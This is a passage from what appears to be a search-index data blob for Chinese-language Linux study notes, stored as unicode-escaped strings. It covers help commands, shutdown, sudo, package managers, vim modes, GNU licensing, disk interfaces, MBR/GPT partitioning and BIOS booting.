\u94FE\u63A5 1. \u5B9E\u4F53\u94FE\u63A5
2. \u7B26\u53F7\u94FE\u63A5 \u83B7\u53D6\u6587\u4EF6\u5185\u5BB9 1. cat
2. tac
3. more
4. less
5. head
6. tail
7. od \u6307\u4EE4\u4E0E\u6587\u4EF6\u641C\u7D22 1. which
2. whereis
3. locate
4. find \u516D\u3001\u538B\u7F29\u4E0E\u6253\u5305 \u538B\u7F29\u6587\u4EF6\u540D
\u538B\u7F29\u6307\u4EE4 1. gzip
2. bzip2
3. xz \u6253\u5305 \u4E03\u3001Bash \u7279\u6027
\u53D8\u91CF\u64CD\u4F5C
\u6307\u4EE4\u641C\u7D22\u987A\u5E8F
\u6570\u636E\u6D41\u91CD\u5B9A\u5411 \u516B\u3001\u7BA1\u9053\u6307\u4EE4 \u63D0\u53D6\u6307\u4EE4
\u6392\u5E8F\u6307\u4EE4
\u53CC\u5411\u8F93\u51FA\u91CD\u5B9A\u5411
\u5B57\u7B26\u8F6C\u6362\u6307\u4EE4
\u5206\u533A\u6307\u4EE4 \u4E5D\u3001\u6B63\u5219\u8868\u8FBE\u5F0F grep
printf
awk \u5341\u3001\u8FDB\u7A0B\u7BA1\u7406 \u67E5\u770B\u8FDB\u7A0B 1. ps
2. pstree
3. top
4. netstat \u8FDB\u7A0B\u72B6\u6001
SIGCHLD
wait()
waitpid()
\u5B64\u513F\u8FDB\u7A0B
\u50F5\u5C38\u8FDB\u7A0B \u53C2\u8003\u8D44\u6599`},{header:"\u524D\u8A00",slug:"\u524D\u8A00",content:`\u4E3A\u4E86\u4FBF\u4E8E\u7406\u89E3\uFF0C\u672C\u6587\u4ECE\u5E38\u7528\u64CD\u4F5C\u548C\u6982\u5FF5\u5F00\u59CB\u8BB2\u8D77\u3002\u867D\u7136\u5DF2\u7ECF\u5C3D\u91CF\u505A\u5230\u7B80\u5316\uFF0C\u4F46\u662F\u6D89\u53CA\u5230\u7684\u5185\u5BB9\u8FD8\u662F\u6709\u70B9\u591A\u3002\u5728\u9762\u8BD5\u4E2D\uFF0CLinux \u77E5\u8BC6\u70B9\u76F8\u5BF9\u4E8E\u7F51\u7EDC\u548C\u64CD\u4F5C\u7CFB\u7EDF\u7B49\u77E5\u8BC6\u70B9\u800C\u8A00\u4E0D\u662F\u90A3\u4E48\u91CD\u8981\uFF0C\u53EA\u9700\u8981\u91CD\u70B9\u638C\u63E1\u4E00\u4E9B\u539F\u7406\u548C\u547D\u4EE4\u5373\u53EF\u3002\u4E3A\u4E86\u65B9\u4FBF\u5927\u5BB6\u51C6\u5907\u9762\u8BD5\uFF0C\u5728\u6B64\u5148\u5C06\u4E00\u4E9B\u6BD4\u8F83\u91CD\u8981\u7684\u77E5\u8BC6\u70B9\u5217\u51FA\u6765\uFF1A \u80FD\u7B80\u5355\u4F7F\u7528 cat\uFF0Cgrep\uFF0Ccut \u7B49\u547D\u4EE4\u8FDB\u884C\u4E00\u4E9B\u64CD\u4F5C\uFF1B
\u6587\u4EF6\u7CFB\u7EDF\u76F8\u5173\u7684\u539F\u7406\uFF0Cinode \u548C block \u7B49\u6982\u5FF5\uFF0C\u6570\u636E\u6062\u590D\uFF1B
\u786C\u94FE\u63A5\u4E0E\u8F6F\u94FE\u63A5\uFF1B
\u8FDB\u7A0B\u7BA1\u7406\u76F8\u5173\uFF0C\u50F5\u5C38\u8FDB\u7A0B\u4E0E\u5B64\u513F\u8FDB\u7A0B\uFF0CSIGCHLD \u3002`},{header:"\u4E00\u3001\u5E38\u7528\u64CD\u4F5C\u4EE5\u53CA\u6982\u5FF5",slug:"\u4E00\u3001\u5E38\u7528\u64CD\u4F5C\u4EE5\u53CA\u6982\u5FF5",content:""},{header:"\u5FEB\u6377\u952E",slug:"\u5FEB\u6377\u952E",content:`Tab\uFF1A\u547D\u4EE4\u548C\u6587\u4EF6\u540D\u8865\u5168\uFF1B
Ctrl+C\uFF1A\u4E2D\u65AD\u6B63\u5728\u8FD0\u884C\u7684\u7A0B\u5E8F\uFF1B
Ctrl+D\uFF1A\u7ED3\u675F\u952E\u76D8\u8F93\u5165\uFF08End Of File\uFF0CEOF\uFF09`},{header:"\u6C42\u52A9",slug:"\u6C42\u52A9",content:""},{header:"1. --help",slug:"_1-help",content:"\u6307\u4EE4\u7684\u57FA\u672C\u7528\u6CD5\u4E0E\u9009\u9879\u4ECB\u7ECD\u3002"},{header:"2. man",slug:"_2-man",content:`man \u662F manual \u7684\u7F29\u5199\uFF0C\u5C06\u6307\u4EE4\u7684\u5177\u4F53\u4FE1\u606F\u663E\u793A\u51FA\u6765\u3002
\u5F53\u6267\u884C man date \u65F6\uFF0C\u6709 DATE(1) \u51FA\u73B0\uFF0C\u5176\u4E2D\u7684\u6570\u5B57\u4EE3\u8868\u6307\u4EE4\u7684\u7C7B\u578B\uFF0C\u5E38\u7528\u7684\u6570\u5B57\u53CA\u5176\u7C7B\u578B\u5982\u4E0B\uFF1A \u4EE3\u53F7
\u7C7B\u578B 1
\u7528\u6237\u5728 shell \u73AF\u5883\u4E2D\u53EF\u4EE5\u64CD\u4F5C\u7684\u6307\u4EE4\u6216\u8005\u53EF\u6267\u884C\u6587\u4EF6 5
\u914D\u7F6E\u6587\u4EF6 8
\u7CFB\u7EDF\u7BA1\u7406\u5458\u53EF\u4EE5\u4F7F\u7528\u7684\u7BA1\u7406\u6307\u4EE4`},{header:"3. info",slug:"_3-info",content:"info \u4E0E man \u7C7B\u4F3C\uFF0C\u4F46\u662F info \u5C06\u6587\u6863\u5206\u6210\u4E00\u4E2A\u4E2A\u9875\u9762\uFF0C\u6BCF\u4E2A\u9875\u9762\u53EF\u4EE5\u8DF3\u8F6C\u3002"},{header:"4. doc",slug:"_4-doc",content:"/usr/share/doc \u5B58\u653E\u7740\u8F6F\u4EF6\u7684\u4E00\u6574\u5957\u8BF4\u660E\u6587\u4EF6\u3002"},{header:"\u5173\u673A",slug:"\u5173\u673A",content:""},{header:"1. who",slug:"_1-who",content:"\u5728\u5173\u673A\u524D\u9700\u8981\u5148\u4F7F\u7528 who \u547D\u4EE4\u67E5\u770B\u6709\u6CA1\u6709\u5176\u5B83\u7528\u6237\u5728\u7EBF\u3002"},{header:"2. sync",slug:"_2-sync",content:"\u4E3A\u4E86\u52A0\u5FEB\u5BF9\u78C1\u76D8\u6587\u4EF6\u7684\u8BFB\u5199\u901F\u5EA6\uFF0C\u4F4D\u4E8E\u5185\u5B58\u4E2D\u7684\u6587\u4EF6\u6570\u636E\u4E0D\u4F1A\u7ACB\u5373\u540C\u6B65\u5230\u78C1\u76D8\uFF0C\u56E0\u6B64\u5173\u673A\u4E4B\u524D\u9700\u8981\u5148\u8FDB\u884C sync \u540C\u6B65\u64CD\u4F5C\u3002"},{header:"3. shutdown",slug:"_3-shutdown",content:`## shutdown [-krhc] \u65F6\u95F4 [\u4FE1\u606F]
-k \uFF1A \u4E0D\u4F1A\u5173\u673A\uFF0C\u53EA\u662F\u53D1\u9001\u8B66\u544A\u4FE1\u606F\uFF0C\u901A\u77E5\u6240\u6709\u5728\u7EBF\u7684\u7528\u6237
-r \uFF1A \u5C06\u7CFB\u7EDF\u7684\u670D\u52A1\u505C\u6389\u540E\u5C31\u91CD\u65B0\u542F\u52A8
-h \uFF1A \u5C06\u7CFB\u7EDF\u7684\u670D\u52A1\u505C\u6389\u540E\u5C31\u7ACB\u5373\u5173\u673A
-c \uFF1A \u53D6\u6D88\u5DF2\u7ECF\u5728\u8FDB\u884C\u7684 shutdown`},{header:"PATH",slug:"path",content:`\u53EF\u4EE5\u5728\u73AF\u5883\u53D8\u91CF PATH \u4E2D\u58F0\u660E\u53EF\u6267\u884C\u6587\u4EF6\u7684\u8DEF\u5F84\uFF0C\u8DEF\u5F84\u4E4B\u95F4\u7528 : \u5206\u9694\u3002
/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin`},{header:"sudo",slug:"sudo",content:"sudo \u5141\u8BB8\u4E00\u822C\u7528\u6237\u4F7F\u7528 root \u53EF\u6267\u884C\u7684\u547D\u4EE4\uFF0C\u4E0D\u8FC7\u53EA\u6709\u5728 /etc/sudoers \u914D\u7F6E\u6587\u4EF6\u4E2D\u6DFB\u52A0\u7684\u7528\u6237\u624D\u80FD\u4F7F\u7528\u8BE5\u6307\u4EE4\u3002"},{header:"\u5305\u7BA1\u7406\u5DE5\u5177",slug:"\u5305\u7BA1\u7406\u5DE5\u5177",content:`RPM \u548C DPKG \u4E3A\u6700\u5E38\u89C1\u7684\u4E24\u7C7B\u8F6F\u4EF6\u5305\u7BA1\u7406\u5DE5\u5177\uFF1A RPM \u5168\u79F0\u4E3A Redhat Package Manager\uFF0C\u6700\u65E9\u7531 Red Hat \u516C\u53F8\u5236\u5B9A\u5B9E\u65BD\uFF0C\u968F\u540E\u88AB GNU \u5F00\u6E90\u64CD\u4F5C\u7CFB\u7EDF\u63A5\u53D7\u5E76\u6210\u4E3A\u8BB8\u591A Linux \u7CFB\u7EDF\u7684\u65E2\u5B9A\u8F6F\u4EF6\u6807\u51C6\u3002YUM \u57FA\u4E8E RPM\uFF0C\u5177\u6709\u4F9D\u8D56\u7BA1\u7406\u548C\u8F6F\u4EF6\u5347\u7EA7\u529F\u80FD\u3002
\u4E0E RPM \u7ADE\u4E89\u7684\u662F\u57FA\u4E8E Debian \u64CD\u4F5C\u7CFB\u7EDF\u7684 DEB \u8F6F\u4EF6\u5305\u7BA1\u7406\u5DE5\u5177 DPKG\uFF0C\u5168\u79F0\u4E3A Debian Package\uFF0C\u529F\u80FD\u65B9\u9762\u4E0E RPM \u76F8\u4F3C\u3002`},{header:"\u53D1\u884C\u7248",slug:"\u53D1\u884C\u7248",content:`Linux \u53D1\u884C\u7248\u662F Linux \u5185\u6838\u53CA\u5404\u79CD\u5E94\u7528\u8F6F\u4EF6\u7684\u96C6\u6210\u7248\u672C\u3002 \u57FA\u4E8E\u7684\u5305\u7BA1\u7406\u5DE5\u5177
\u5546\u4E1A\u53D1\u884C\u7248
\u793E\u533A\u53D1\u884C\u7248 RPM
Red Hat
Fedora / CentOS DPKG
Ubuntu
Debian`},{header:"VIM \u4E09\u4E2A\u6A21\u5F0F",slug:"vim-\u4E09\u4E2A\u6A21\u5F0F",content:`\u4E00\u822C\u6307\u4EE4\u6A21\u5F0F\uFF08Command mode\uFF09\uFF1AVIM \u7684\u9ED8\u8BA4\u6A21\u5F0F\uFF0C\u53EF\u4EE5\u7528\u4E8E\u79FB\u52A8\u6E38\u6807\u67E5\u770B\u5185\u5BB9\uFF1B
\u7F16\u8F91\u6A21\u5F0F\uFF08Insert mode\uFF09\uFF1A\u6309\u4E0B "i" \u7B49\u6309\u952E\u4E4B\u540E\u8FDB\u5165\uFF0C\u53EF\u4EE5\u5BF9\u6587\u672C\u8FDB\u884C\u7F16\u8F91\uFF1B
\u6307\u4EE4\u5217\u6A21\u5F0F\uFF08Bottom-line mode\uFF09\uFF1A\u6309\u4E0B ":" \u6309\u952E\u4E4B\u540E\u8FDB\u5165\uFF0C\u7528\u4E8E\u4FDD\u5B58\u9000\u51FA\u7B49\u64CD\u4F5C\u3002 \u5728\u6307\u4EE4\u5217\u6A21\u5F0F\u4E0B\uFF0C\u6709\u4EE5\u4E0B\u547D\u4EE4\u7528\u4E8E\u79BB\u5F00\u6216\u8005\u4FDD\u5B58\u6587\u4EF6\u3002 \u547D\u4EE4
\u4F5C\u7528 :w
\u5199\u5165\u78C1\u76D8 :w!
\u5F53\u6587\u4EF6\u4E3A\u53EA\u8BFB\u65F6\uFF0C\u5F3A\u5236\u5199\u5165\u78C1\u76D8\u3002\u5230\u5E95\u80FD\u4E0D\u80FD\u5199\u5165\uFF0C\u4E0E\u7528\u6237\u5BF9\u8BE5\u6587\u4EF6\u7684\u6743\u9650\u6709\u5173 :q
\u79BB\u5F00 :q!
\u5F3A\u5236\u79BB\u5F00\u4E0D\u4FDD\u5B58 :wq
\u5199\u5165\u78C1\u76D8\u540E\u79BB\u5F00 :wq!
\u5F3A\u5236\u5199\u5165\u78C1\u76D8\u540E\u79BB\u5F00`},{header:"GNU",slug:"gnu",content:`GNU \u8BA1\u5212\uFF0C\u8BD1\u4E3A\u9769\u5974\u8BA1\u5212\uFF0C\u5B83\u7684\u76EE\u6807\u662F\u521B\u5EFA\u4E00\u5957\u5B8C\u5168\u81EA\u7531\u7684\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u79F0\u4E3A GNU\uFF0C\u5176\u5185\u5BB9\u8F6F\u4EF6\u5B8C\u5168\u4EE5 GPL \u65B9\u5F0F\u53D1\u5E03\u3002\u5176\u4E2D GPL \u5168\u79F0\u4E3A GNU \u901A\u7528\u516C\u5171\u8BB8\u53EF\u534F\u8BAE\uFF08GNU General Public License\uFF09\uFF0C\u5305\u542B\u4E86\u4EE5\u4E0B\u5185\u5BB9\uFF1A \u4EE5\u4EFB\u4F55\u76EE\u7684\u8FD0\u884C\u6B64\u7A0B\u5E8F\u7684\u81EA\u7531\uFF1B
\u518D\u590D\u5236\u7684\u81EA\u7531\uFF1B
\u6539\u8FDB\u6B64\u7A0B\u5E8F\uFF0C\u5E76\u516C\u5F00\u53D1\u5E03\u6539\u8FDB\u7684\u81EA\u7531\u3002`},{header:"\u5F00\u6E90\u534F\u8BAE",slug:"\u5F00\u6E90\u534F\u8BAE",content:`Choose an open source license
\u5982\u4F55\u9009\u62E9\u5F00\u6E90\u8BB8\u53EF\u8BC1\uFF1F`},{header:"\u4E8C\u3001\u78C1\u76D8",slug:"\u4E8C\u3001\u78C1\u76D8",content:""},{header:"\u78C1\u76D8\u63A5\u53E3",slug:"\u78C1\u76D8\u63A5\u53E3",content:""},{header:"1. IDE",slug:"_1-ide",content:`IDE\uFF08ATA\uFF09\u5168\u79F0 Advanced Technology Attachment\uFF0C\u63A5\u53E3\u901F\u5EA6\u6700\u5927\u4E3A 133MB/s\uFF0C\u56E0\u4E3A\u5E76\u53E3\u7EBF\u7684\u6297\u5E72\u6270\u6027\u592A\u5DEE\uFF0C\u4E14\u6392\u7EBF\u5360\u7528\u7A7A\u95F4\u8F83\u5927\uFF0C\u4E0D\u5229\u7535\u8111\u5185\u90E8\u6563\u70ED\uFF0C\u5DF2\u9010\u6E10\u88AB SATA \u6240\u53D6\u4EE3\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/924914c0-660c-4e4a-bbc0-1df1146e7516.jpg" width="400)`},{header:"2. SATA",slug:"_2-sata",content:`SATA \u5168\u79F0 Serial ATA\uFF0C\u4E5F\u5C31\u662F\u4F7F\u7528\u4E32\u53E3\u7684 ATA \u63A5\u53E3\uFF0C\u6297\u5E72\u6270\u6027\u5F3A\uFF0C\u4E14\u5BF9\u6570\u636E\u7EBF\u7684\u957F\u5EA6\u8981\u6C42\u6BD4 ATA \u4F4E\u5F88\u591A\uFF0C\u652F\u6301\u70ED\u63D2\u62D4\u7B49\u529F\u80FD\u3002SATA-II \u7684\u63A5\u53E3\u901F\u5EA6\u4E3A 300MB/s\uFF0C\u800C SATA-III \u6807\u51C6\u53EF\u8FBE\u5230 600MB/s \u7684\u4F20\u8F93\u901F\u5EA6\u3002SATA \u7684\u6570\u636E\u7EBF\u4E5F\u6BD4 ATA \u7684\u7EC6\u5F97\u591A\uFF0C\u6709\u5229\u4E8E\u673A\u7BB1\u5185\u7684\u7A7A\u6C14\u6D41\u901A\uFF0C\u6574\u7406\u7EBF\u6750\u4E5F\u6BD4\u8F83\u65B9\u4FBF\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9f2a16b-4843-44d1-9759-c745772e9bcf.jpg" width=")`},{header:"3. SCSI",slug:"_3-scsi",content:`SCSI \u5168\u79F0\u662F Small Computer System Interface\uFF08\u5C0F\u578B\u673A\u7CFB\u7EDF\u63A5\u53E3\uFF09\uFF0CSCSI \u786C\u76D8\u5E7F\u4E3A\u5DE5\u4F5C\u7AD9\u4EE5\u53CA\u4E2A\u4EBA\u7535\u8111\u4EE5\u53CA\u670D\u52A1\u5668\u6240\u4F7F\u7528\uFF0C\u56E0\u6B64\u4F1A\u4F7F\u7528\u8F83\u4E3A\u5148\u8FDB\u7684\u6280\u672F\uFF0C\u5982\u789F\u7247\u8F6C\u901F 15000rpm \u7684\u9AD8\u8F6C\u901F\uFF0C\u4E14\u4F20\u8F93\u65F6 CPU \u5360\u7528\u7387\u8F83\u4F4E\uFF0C\u4F46\u662F\u5355\u4EF7\u4E5F\u6BD4\u76F8\u540C\u5BB9\u91CF\u7684 ATA \u53CA SATA \u786C\u76D8\u66F4\u52A0\u6602\u8D35\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f0574025-c514-49f5-a591-6d6a71f271f7.jpg" width=")`},{header:"4. SAS",slug:"_4-sas",content:`SAS\uFF08Serial Attached SCSI\uFF09\u662F\u65B0\u4E00\u4EE3\u7684 SCSI \u6280\u672F\uFF0C\u548C SATA \u786C\u76D8\u76F8\u540C\uFF0C\u90FD\u662F\u91C7\u53D6\u5E8F\u5217\u5F0F\u6280\u672F\u4EE5\u83B7\u5F97\u66F4\u9AD8\u7684\u4F20\u8F93\u901F\u5EA6\uFF0C\u53EF\u8FBE\u5230 6Gb/s\u3002\u6B64\u5916\u4E5F\u901A\u8FC7\u7F29\u5C0F\u8FDE\u63A5\u7EBF\u6539\u5584\u7CFB\u7EDF\u5185\u90E8\u7A7A\u95F4\u7B49\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6729baa0-57d7-4817-b3aa-518cbccf824c.jpg" width=")`},{header:"\u78C1\u76D8\u7684\u6587\u4EF6\u540D",slug:"\u78C1\u76D8\u7684\u6587\u4EF6\u540D",content:`Linux \u4E2D\u6BCF\u4E2A\u786C\u4EF6\u90FD\u88AB\u5F53\u505A\u4E00\u4E2A\u6587\u4EF6\uFF0C\u5305\u62EC\u78C1\u76D8\u3002\u78C1\u76D8\u4EE5\u78C1\u76D8\u63A5\u53E3\u7C7B\u578B\u8FDB\u884C\u547D\u540D\uFF0C\u5E38\u89C1\u78C1\u76D8\u7684\u6587\u4EF6\u540D\u5982\u4E0B\uFF1A IDE \u78C1\u76D8\uFF1A/dev/hd[a-d]
SATA/SCSI/SAS \u78C1\u76D8\uFF1A/dev/sd[a-p] \u5176\u4E2D\u6587\u4EF6\u540D\u540E\u9762\u7684\u5E8F\u53F7\u7684\u786E\u5B9A\u4E0E\u7CFB\u7EDF\u68C0\u6D4B\u5230\u78C1\u76D8\u7684\u987A\u5E8F\u6709\u5173\uFF0C\u800C\u4E0E\u78C1\u76D8\u6240\u63D2\u5165\u7684\u63D2\u69FD\u4F4D\u7F6E\u65E0\u5173\u3002`},{header:"\u4E09\u3001\u5206\u533A",slug:"\u4E09\u3001\u5206\u533A",content:""},{header:"\u5206\u533A\u8868",slug:"\u5206\u533A\u8868",content:"\u78C1\u76D8\u5206\u533A\u8868\u4E3B\u8981\u6709\u4E24\u79CD\u683C\u5F0F\uFF0C\u4E00\u79CD\u662F\u9650\u5236\u8F83\u591A\u7684 MBR \u5206\u533A\u8868\uFF0C\u4E00\u79CD\u662F\u8F83\u65B0\u4E14\u9650\u5236\u8F83\u5C11\u7684 GPT \u5206\u533A\u8868\u3002"},{header:"1. MBR",slug:"_1-mbr",content:`MBR \u4E2D\uFF0C\u7B2C\u4E00\u4E2A\u6247\u533A\u6700\u91CD\u8981\uFF0C\u91CC\u9762\u6709\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08Master boot record, MBR\uFF09\u53CA\u5206\u533A\u8868\uFF08partition table\uFF09\uFF0C\u5176\u4E2D\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\u5360 446 bytes\uFF0C\u5206\u533A\u8868\u5360 64 bytes\u3002
\u5206\u533A\u8868\u53EA\u6709 64 bytes\uFF0C\u6700\u591A\u53EA\u80FD\u5B58\u50A8 4 \u4E2A\u5206\u533A\uFF0C\u8FD9 4 \u4E2A\u5206\u533A\u4E3A\u4E3B\u5206\u533A\uFF08Primary\uFF09\u548C\u6269\u5C55\u5206\u533A\uFF08Extended\uFF09\u3002\u5176\u4E2D\u6269\u5C55\u5206\u533A\u53EA\u6709\u4E00\u4E2A\uFF0C\u5B83\u4F7F\u7528\u5176\u5B83\u6247\u533A\u6765\u8BB0\u5F55\u989D\u5916\u7684\u5206\u533A\u8868\uFF0C\u56E0\u6B64\u901A\u8FC7\u6269\u5C55\u5206\u533A\u53EF\u4EE5\u5206\u51FA\u66F4\u591A\u5206\u533A\uFF0C\u8FD9\u4E9B\u5206\u533A\u79F0\u4E3A\u903B\u8F91\u5206\u533A\u3002
Linux \u4E5F\u628A\u5206\u533A\u5F53\u6210\u6587\u4EF6\uFF0C\u5206\u533A\u6587\u4EF6\u7684\u547D\u540D\u65B9\u5F0F\u4E3A\uFF1A\u78C1\u76D8\u6587\u4EF6\u540D + \u7F16\u53F7\uFF0C\u4F8B\u5982 /dev/sda1\u3002\u6CE8\u610F\uFF0C\u903B\u8F91\u5206\u533A\u7684\u7F16\u53F7\u4ECE 5 \u5F00\u59CB\u3002`},{header:"2. GPT",slug:"_2-gpt",content:`\u6247\u533A\u662F\u78C1\u76D8\u7684\u6700\u5C0F\u5B58\u50A8\u5355\u4F4D\uFF0C\u65E7\u78C1\u76D8\u7684\u6247\u533A\u5927\u5C0F\u901A\u5E38\u4E3A 512 bytes\uFF0C\u800C\u6700\u65B0\u7684\u78C1\u76D8\u652F\u6301 4 k\u3002GPT \u4E3A\u4E86\u517C\u5BB9\u6240\u6709\u78C1\u76D8\uFF0C\u5728\u5B9A\u4E49\u6247\u533A\u4E0A\u4F7F\u7528\u903B\u8F91\u533A\u5757\u5730\u5740\uFF08Logical Block Address, LBA\uFF09\uFF0CLBA \u9ED8\u8BA4\u5927\u5C0F\u4E3A 512 bytes\u3002
GPT \u7B2C 1 \u4E2A\u533A\u5757\u8BB0\u5F55\u4E86\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\uFF0C\u7D27\u63A5\u7740\u662F 33 \u4E2A\u533A\u5757\u8BB0\u5F55\u5206\u533A\u4FE1\u606F\uFF0C\u5E76\u628A\u6700\u540E\u7684 33 \u4E2A\u533A\u5757\u7528\u4E8E\u5BF9\u5206\u533A\u4FE1\u606F\u8FDB\u884C\u5907\u4EFD\u3002\u8FD9 33 \u4E2A\u533A\u5757\u7B2C\u4E00\u4E2A\u4E3A GPT \u8868\u5934\u7EAA\u5F55\uFF0C\u8FD9\u4E2A\u90E8\u4EFD\u7EAA\u5F55\u4E86\u5206\u533A\u8868\u672C\u8EAB\u7684\u4F4D\u7F6E\u4E0E\u5927\u5C0F\u548C\u5907\u4EFD\u5206\u533A\u7684\u4F4D\u7F6E\uFF0C\u540C\u65F6\u653E\u7F6E\u4E86\u5206\u533A\u8868\u7684\u6821\u9A8C\u7801 (CRC32)\uFF0C\u64CD\u4F5C\u7CFB\u7EDF\u53EF\u4EE5\u6839\u636E\u8FD9\u4E2A\u6821\u9A8C\u7801\u6765\u5224\u65AD GPT \u662F\u5426\u6B63\u786E\u3002\u82E5\u6709\u9519\u8BEF\uFF0C\u53EF\u4EE5\u4F7F\u7528\u5907\u4EFD\u5206\u533A\u8FDB\u884C\u6062\u590D\u3002
GPT \u6CA1\u6709\u6269\u5C55\u5206\u533A\u6982\u5FF5\uFF0C\u90FD\u662F\u4E3B\u5206\u533A\uFF0C\u6BCF\u4E2A LBA \u53EF\u4EE5\u5206 4 \u4E2A\u5206\u533A\uFF0C\u56E0\u6B64\u603B\u5171\u53EF\u4EE5\u5206 4 * 32 = 128 \u4E2A\u5206\u533A\u3002
MBR \u4E0D\u652F\u6301 2.2 TB \u4EE5\u4E0A\u7684\u786C\u76D8\uFF0CGPT \u5219\u6700\u591A\u652F\u6301\u5230 233 TB = 8 ZB\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/GUID_Partition_Table_Scheme.svg.png" width="400)`},{header:"\u5F00\u673A\u68C0\u6D4B\u7A0B\u5E8F",slug:"\u5F00\u673A\u68C0\u6D4B\u7A0B\u5E8F",content:""},{header:"1. BIOS",slug:"_1-bios",content:`BIOS\uFF08Basic Input/Output System\uFF0C\u57FA\u672C\u8F93\u5165\u8F93\u51FA\u7CFB\u7EDF\uFF09\uFF0C\u5B83\u662F\u4E00\u4E2A\u56FA\u4EF6\uFF08\u5D4C\u5165\u5728\u786C\u4EF6\u4E2D\u7684\u8F6F\u4EF6\uFF09\uFF0CBIOS \u7A0B\u5E8F\u5B58\u653E\u5728\u65AD\u7535\u540E\u5185\u5BB9\u4E0D\u4F1A\u4E22\u5931\u7684\u53EA\u8BFB\u5185\u5B58\u4E2D\u3002 BIOS \u662F\u5F00\u673A\u7684\u65F6\u5019\u8BA1\u7B97\u673A\u6267\u884C\u7684\u7B2C\u4E00\u4E2A\u7A0B\u5E8F\uFF0C\u8FD9\u4E2A\u7A0B\u5E8F\u77E5\u9053\u53EF\u4EE5\u5F00\u673A\u7684\u78C1\u76D8\uFF0C\u5E76\u8BFB\u53D6\u78C1\u76D8\u7B2C\u4E00\u4E2A\u6247\u533A\u7684\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\uFF0C\u7531\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\u6267\u884C\u5176\u4E2D\u7684\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\uFF0C\u8FD9\u4E2A\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u4F1A\u52A0\u8F7D\u64CD\u4F5C\u7CFB\u7EDF\u7684\u6838\u5FC3\u6587\u4EF6\u3002
\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\u4E2D\u7684\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u63D0\u4F9B\u4EE5\u4E0B\u529F\u80FD\uFF1A\u9009\u5355\u3001\u8F7D\u5165\u6838\u5FC3\u6587\u4EF6\u4EE5\u53CA\u8F6C\u4EA4\u5176\u5B83\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u3002\u8F6C\u4EA4\u8FD9\u4E2A\u529F\u80FD\u53EF\u4EE5\u7528\u6765\u5B9E\u73B0\u591A\u91CD\u5F15\u5BFC\uFF0C\u53EA\u9700\u8981\u5C06\u53E6\u4E00\u4E2A\u64CD\u4F5C\u7CFB\u7EDF\u7684\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u5B89\u88C5\u5728\u5176\u5B83\u5206\u533A\u7684\u542F\u52A8\u6247\u533A\u4E0A\uFF0C\u5728\u542F\u52A8\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u65F6\uFF0C\u5C31\u53EF\u4EE5\u901A\u8FC7\u9009\u5355\u9009\u62E9\u542F\u52A8\u5F53\u524D\u7684\u64CD\u4F5C\u7CFB\u7EDF\u6216\u8005\u8F6C\u4EA4\u7ED9\u5176\u5B83\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u4ECE\u800C\u542F\u52A8\u53E6\u4E00\u4E2A\u64CD\u4F5C\u7CFB\u7EDF\u3002
\u4E0B\u56FE\u4E2D\uFF0C\u7B2C\u4E00\u6247\u533A\u7684\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\u4E2D\u7684\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u63D0\u4F9B\u4E86\u4E24\u4E2A\u9009\u5355\uFF1AM1\u3001M2\uFF0CM1 \u6307\u5411\u4E86 Windows \u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u800C M2 \u6307\u5411\u5176\u5B83\u5206\u533A\u7684\u542F\u52A8\u6247\u533A\uFF0C\u91CC\u9762\u5305\u542B\u4E86\u53E6\u5916\u4E00\u4E2A\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\uFF0C\u63D0\u4F9B\u4E86\u4E00\u4E2A\u6307\u5411 Linux \u7684\u9009\u5355\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f900f266-a323-42b2-bc43-218fdb8811a8.jpg" width="600)
\u5B89\u88C5\u591A\u91CD\u5F15\u5BFC\uFF0C\u6700\u597D\u5148\u5B89\u88C5 Windows \u518D\u5B89\u88C5 Linux\u3002\u56E0\u4E3A\u5B89\u88C5 Windows \u65F6\u4F1A\u8986\u76D6\u6389\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\uFF0C\u800C Linux \u53EF\u4EE5\u9009\u62E9\u5C06\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u5B89\u88C5\u5728\u4E3B\u8981\u5F00\u673A\u8BB0\u5F55\uFF08MBR\uFF09\u6216\u8005\u5176\u5B83\u5206\u533A\u7684\u542F\u52A8\u6247\u533A\uFF0C\u5E76\u4E14\u53EF\u4EE5\u8BBE\u7F6E\u5F00\u673A\u7BA1\u7406\u7A0B\u5E8F\u7684\u9009\u5355\u3002`},{header:"2. UEFI",slug:"_2-uefi",content:"BIOS \u4E0D\u53EF\u4EE5\u8BFB\u53D6 GPT \u5206\u533A\u8868\uFF0C\u800C UEFI 